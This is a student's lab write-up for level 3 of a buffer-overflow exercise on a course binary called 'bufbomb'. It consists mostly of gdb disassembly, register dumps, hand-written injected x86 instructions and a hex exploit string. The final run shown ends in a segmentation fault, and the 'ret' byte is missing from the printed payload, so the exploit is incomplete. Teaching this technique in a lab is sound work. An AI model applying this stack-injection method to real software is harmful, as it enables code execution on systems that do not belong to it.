Level 3
=======
Goal = push machine instructions on to the stack and include the address of where your injected instructions reside on the stack. Also need to allow getbuf() to return to the original calling function test() with the value of your cookie(cookie = hex of "quinnliu" = 0x2d8cc70c)

First let's view the disassembly of test() by typing:
```
unix> gdb bufbomb
(gdb) break test
(gdb) run -u quinnliu
(gdb) disas
```

Gives you:
```
(gdb) disas
Dump of assembler code for function test:
   0x08048c7f <+0>:     push   %ebp
   0x08048c80 <+1>:     mov    %esp,%ebp
   0x08048c82 <+3>:     push   %ebx
=> 0x08048c83 <+4>:     sub    $0x24,%esp
   0x08048c86 <+7>:     call   0x8048b30 <uniqueval>
   0x08048c8b <+12>:    mov    %eax,-0xc(%ebp)
   0x08048c8e <+15>:    call   0x8048c04 <getbuf>
   0x08048c93 <+20>:    mov    %eax,%ebx # <=== Whatever was stored in %eax in getbuf() is now in %ebx of test()
   0x08048c95 <+22>:    call   0x8048b30 <uniqueval>
   0x08048c9a <+27>:    mov    -0xc(%ebp),%edx
   0x08048c9d <+30>:    cmp    %edx,%eax
   0x08048c9f <+32>:    je     0x8048caf <test+48>
   0x08048ca1 <+34>:    movl   $0x804a098,(%esp)
   0x08048ca8 <+41>:    call   0x8048940 <puts@plt>
   0x08048cad <+46>:    jmp    0x8048ce5 <test+102>
   0x08048caf <+48>:    cmp    0x804c1e4,%ebx
   0x08048cb5 <+54>:    jne    0x8048cd5 <test+86>
   0x08048cb7 <+56>:    mov    %ebx,0x4(%esp)
   0x08048cbb <+60>:    movl   $0x8049f03,(%esp)
   0x08048cc2 <+67>:    call   0x80488e0 <printf@plt>
   0x08048cc7 <+72>:    movl   $0x3,(%esp)
   0x08048cce <+79>:    call   0x80490d4 <validate>
   0x08048cd3 <+84>:    jmp    0x8048ce5 <test+102>
   0x08048cd5 <+86>:    mov    %ebx,0x4(%esp)
   0x08048cd9 <+90>:    movl   $0x8049f20,(%esp)
   0x08048ce0 <+97>:    call   0x80488e0 <printf@plt>
   0x08048ce5 <+102>:   add    $0x24,%esp
   0x08048ce8 <+105>:   pop    %ebx
   0x08048ce9 <+106>:   pop    %ebp
   0x08048cea <+107>:   ret
End of assembler dump.
```

Second let's view the disassembly of getbuf() by typing:

```
unix> gdb bufbomb
(gdb) break getbuf
(gdb) run -u quinnliu
(gdb) disas
```

Gives you:

```
(gdb) disas
Dump of assembler code for function getbuf:
   0x08048c04 <+0>:     push   %ebp
   0x08048c05 <+1>:     mov    %esp,%ebp
   0x08048c07 <+3>:     sub    $0x38,%esp
=> 0x08048c0a <+6>:     lea    -0x28(%ebp),%eax
   0x08048c0d <+9>:     mov    %eax,(%esp)
   0x08048c10 <+12>:    call   0x8048b4a <Gets>
   0x08048c15 <+17>:    mov    $0x1,%eax
   0x08048c1a <+22>:    leave
   0x08048c1b <+23>:    ret
End of assembler dump.
```

At getbuf+17 the mov instruction places the value 1 in the register %eax. When getbuf() retuns to the test() method on test+20, whatever value was held at %eax of getbuf() is now also stored in %ebx of test().

We need to store our cookie hex id into the %eax register while in the getbuf() function so it can be also stored in %ebx of test().

Another important instruction to notice in the function test(), is at test+27. Where the mov instruction is taking -0xC bytes from the base pointer %ebp and storing that value at %edx which is later compared to %eax. In the previous level when we injected machine code we had corrupted the state of the stack but since we were redirecting the program to bang() instead of the original calling function test(), we did not have to worry about the exact state of the stack as long as our exploit still forced the bufbomb binary to be redirected to bang().

Let's see what happens during a normal execution of the bufbomb in level 3 without instructions added to the buffer overflow

```
unix> gdb bufbomb
(gdb) break test
(gdb) run -u quinnliu
(gdb) disas # not displayed below but can be seen at top of this file
(gdb) break *test+12
(gdb) cont
(gdb) i r
```

Gives you:

```
Breakpoint 2, 0x08048c8b in test ()
(gdb) i r
eax            0x3365b045       862302277
ecx            0x3365b045       862302277
edx            0xbe3048 12464200
ebx            0x0      0
esp            0x55683358       0x55683358
ebp            0x55683380       0x55683380
esi            0x55686018       1432903704
edi            0xc60    3168
eip            0x8048c8b        0x8048c8b <test+12>
eflags         0x202    [ IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99

```

I set a breakpoint at test+12 to examine the register state so I could see what is being passed from %eax to -0xC(%ebp) via the instruction mov. In this instance the value being mov'd from %eax to the offset -0xC(%ebp) is 0x3365b045. However, with each execution of the program this value is different. But the relative offset of where it is stored is always the same.

Now I'll resume execution and then after getbuf has returned examine the value at the offset -0xc(%ebp) to verify that is indeed the same value that was originally stored there with the instruction mov at test+12. 

While still in gdb type:
``` 
(gdb) break *test+27
(gdb) cont
AAAAAAAA
(gdb) i r
```

Gives you:
```
(gdb) break *test+27
Breakpoint 3 at 0x8048c9a
(gdb) cont
Continuing.
Type string:AAAAAAAA

Breakpoint 3, 0x08048c9a in test ()
(gdb) i r
eax            0x3365b045       862302277
ecx            0x3365b045       862302277
edx            0xbe3048 12464200
ebx            0x1      1
esp            0x55683358       0x55683358
ebp            0x55683380       0x55683380
esi            0x55686018       1432903704
edi            0xc60    3168
eip            0x8048c9a        0x8048c9a <test+27>
eflags         0x202    [ IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```

```
currentAddress%ebp - 0xC = addressOfOffsetOnStack
    0x55683380     - 0xC = 0x55683374
```

Now let's examine our calculated offset:
```
(gdb) x 0x55683374
0x55683374 <_reserved+1037172>: 0x3365b045
```

WOW! 0x3365b045 is exactly what was expected. When we start injecting machine code onto the stack we will corrupt the stack and the original %ebp will be overwritten with our exploit code. In previous levels, overwriting %ebp with our exploit code did not negatively affect the outcome since we redirected the program to just quit the bufbomb binary as opposed to attempting to return to a calling fucntion.

However, in level 3 we inject exploit code onto the stack to force getbuf() to return our cookie, and then push the address of where getbuf() would normally return to we'd receive a message stating that the stack has been corrupted. The program bufbomb detects this by grabbing the dynamic value held in %eax at test+12 and storing at the offset -0xc(%ebp), it then executes getbuf() and then shortly after returning from getbuf() compares the value at offset -0xc(%ebp) to %edx on test+27. If the value held at -0xC(%ebp) matches with the value at %edx then it will set a Z flag to 1 via the cmp on test+30. On test+32 the JE jump is taken if the Z flag has been set(ZF = 1), thus positively or negatively affecting the output of the bufbomb program depending on the state of %ebp.

Why do we care? Well, if we inject our exploit it is going to corrupt the stack and when getbuf() returns back to test() it will try to grab the value held at the relative offset -0xC(%ebp), but since %ebp has been over written by our exploit it will grab an incorrect value. Besides the program being aware of the corrupted stack and stating as such, at any point where the program tries to return from a function it will receive a segfault since %ebp has not been restored to its original state.

Instead of just pushing the return address and returning with the quinnliu hex cookie, %ebp needs to be replaced with the original %ebp value so bufbomb can continue on without any segfaults.

write the following into a file "assemblylevel3.s":
```
movl $0x2d8cc70c , %eax
pushl $0x08048c93
ret
```

Then type:
```
unix> gcc -m32 -c assemblylevel3.s
unix> objdump -d assemblylevel3.o
```

And you will get:
```
unix> objdump -d assemblylevel3.o

assemblylevel3.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   b8 0c c7 8c 2d          mov    $0x2d8cc70c,%eax
   5:   68 93 8c 04 08          push   $0x8048c93
```

Now you will want to copy the hex representation of the assembly instructions so it can be placed in the exploit string:

```
unix> perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "58 33 68 55 ", "b8 0c c7 8c 2d 68 93 8c 04 08"' > hexlevel3
```

"58 33 68 55 " is the little endian address of where our exploit resides on the stack from level 2. When we inject the exploit onto the stack, this address will be what the eip points to after returning from getbuf().

Now type:
```
unix> ./hex2raw < hexlevel3 > raw
unix> gdb bufbomb
(gdb) break *test+3
(gdb) run -u quinnliu
(gdb) i r
```

Gives you:
```
(gdb) i r
eax            0xc      12
ecx            0x55683370       1432892272
edx            0xbe4340 12469056
ebx            0x0      0
esp            0x55683380       0x55683380
ebp            0x55683380       0x55683380
esi            0x55686018       1432903704
edi            0xc60    3168
eip            0x8048c82        0x8048c82 <test+3>
eflags         0x246    [ PF ZF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```

We can see that %ebp is 0x55683380 before the exploit corrupts the stack. To successfully exploti bufbomb we will have to mov this onto %ebp similar to when we pushed the hex cookie of quinnliu into %eax.

This means our "assemblylevel3.s" with this fix will look like:
```
movl $0x2d8cc70c , %eax
movl $0x55683380 , %ebp
pushl $0x08048c93
ret
```

Then type:
```
unix> gcc -m32 -c assemblylevel3.s
unix> objdump -d assemblylevel3.o
```

And you will get:
```
unix> objdump -d assemblylevel3.o

assemblylevel3.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:   b8 0c c7 8c 2d          mov    $0x2d8cc70c,%eax
   5:   bd 80 33 68 55          mov    $0x55683380,%ebp
   a:   68 93 8c 04 08          push   $0x8048c93
```

Now you will want to copy the hex representation of the assembly instructions so it can be placed in the exploit string:

```
unix> perl -e 'print "61 "x32, "BB "x4, "CC "x4, "DD "x4, "58 33 68 55 ", "b8 0c c7 8c 2d bd 80 33 68 55 68 93 8c 04 08" ' > hexlevel3_2
```

Now type:
```
unix> ./hex2raw < hexlevel3_2 > raw
unix> gdb bufbomb
(gdb) run -u quinnliu < raw
```

Gives you:
```
(gdb) run -u quinnliu < raw
Starting program: /home/ugrads/majors/quinnliu/Desktop/ComputerOrganizationII/buflab-handout/bufbomb -u quinnliu < raw
Userid: quinnliu
Cookie: 0x2d8cc70c

Program received signal SIGSEGV, Segmentation fault.
0x98316855 in ?? ()
Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.47.el6_2.5.i686
```

